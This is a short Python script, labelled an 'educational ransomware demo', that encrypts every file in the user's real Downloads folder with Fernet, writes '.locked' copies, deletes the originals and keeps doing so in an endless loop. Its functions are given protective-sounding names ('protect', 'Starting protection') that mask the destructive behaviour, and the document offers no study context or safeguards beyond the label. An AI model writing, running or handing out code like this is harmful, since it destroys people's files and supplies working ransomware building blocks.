#!/usr/bin/env python3
"""
Educational ransomware demo.
"""

import os, sys
from cryptography.fernet import Fernet
from pathlib import Path
import time

def setup():
    """Setup encryption key."""
    if not os.path.exists("key.key"):
        print("[+] Creating new encryption key...")
        with open("key.key", "wb") as f:
            f.write(Fernet.generate_key())
    
    return Path("key.key").read_bytes()

def protect(file_path, key):
    """Encrypt file using Fernet."""
    try:
        cipher = Fernet(key)
        
        # Create encrypted copy
        with open(file_path, 'rb') as f_in, \
             open(str(file_path) + ".locked", 'wb') as f_out:
            encrypted_data = cipher.encrypt(f_in.read())
            f_out.write(encrypted_data)
            
        # Remove original file
        os.remove(file_path)
        
    except Exception as e:
        print(f"Error protecting {file_path}: {e}")

def monitor():
    """Start monitoring downloads folder."""
    
    key = setup()
    download_path = Path.home() / "Downloads"
    
    if not download_path.exists():
        print("[!] Downloads folder not found!")
        sys.exit(1)
    
    print(f"[+] Starting protection on: {download_path}")
    
    # Start from now
    start_time = time.time()
    
    while True:
        try:
            # Check for new files every second
            if (time.time() - start_time) > 1:
                for file in download_path.glob("*"):
                    if not str(file).endswith(".locked") and \
                       os.path.isfile(str(file)):
                        protect(file, key)
                        
                # Reset time counter
                start_time = time.time()
                
        except KeyboardInterrupt:
            print("\n[!] Exiting...")
            break

if __name__ == "__main__":
    monitor()